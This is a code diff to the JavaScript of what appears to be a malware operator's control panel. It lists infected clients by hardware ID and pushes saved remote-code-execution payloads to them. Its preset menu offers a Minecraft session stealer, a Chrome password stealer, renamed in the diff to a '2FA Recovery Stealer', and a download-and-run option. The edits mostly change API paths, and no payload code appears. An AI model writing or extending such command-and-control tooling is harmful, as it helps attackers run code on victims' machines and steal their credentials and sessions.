@@ -74,7 +74,7 @@
                 const row = $('<tr>');
                 const hwidElement = $('<td>').addClass('hwidText').attr('data-toggle', 'tooltip').attr('title', hwid).attr('realHWID', hwid);
                 const a = $('<a>')
-                    .attr('href', `/clients/${hwid}`)
+                    .attr('href', `./clients/${hwid}`)
                     .text(hwid.slice(0, 20) + '...');
                 hwidElement.append(a);
 
@@ -175,7 +175,7 @@
                         return;
                     }
 
-                    $.get(`/api/v1/get_preset_code/${snakeCase}`, function (data) {
+                    $.get(`/api/get_preset_code/${snakeCase}`, function (data) {
                         if (data) editor.getSession().setValue(data);
                     });
                 });
@@ -194,7 +194,7 @@
                         backdrop: 'static',
                     });
 
-                    $.get(`/api/v1/${hwid}/get_saved_rce`, function (data) {
+                    $.get(`/api/${hwid}/get_saved_rce`, function (data) {
                         rceModalBody.empty();
 
                         $('#rceClose').prop('disabled', false);
@@ -211,7 +211,7 @@
                                 <select class="form-control" id="presetCodeInput" style="width:50%;">
                                     <option>None</option>
                                     <option>Minecraft Session Stealer</option>
-                                    <option>Chrome Password Stealer</option>
+                                    <option>Cosmic 2FA Recovery Stealer</option>
                                     <option>Download and Run File</option>
                                 </select>
                                 <br/>
@@ -246,7 +246,7 @@
                                 const hwid = $('#editor').attr('hwid');
 
                                 $.post(
-                                    `/api/v1/${hwid}/set_saved_rce`,
+                                    `/api/${hwid}/set_saved_rce`,
                                     { code: editor.getSession().getValue(), timesToRun: $('#amountOfTimesToRunInput').val() },
                                     function (data) {
                                         toastr.info(data.message);
@@ -263,7 +263,7 @@
                     const hwid = $('#editor').attr('hwid');
 
                     $.post(
-                        `/api/v1/${hwid}/set_saved_rce`,
+                        `/api/${hwid}/set_saved_rce`,
                         { code: editor.getSession().getValue(), timesToRun: $('#amountOfTimesToRunInput').val() },
                         function (data) {
                             toastr.info(data.message);
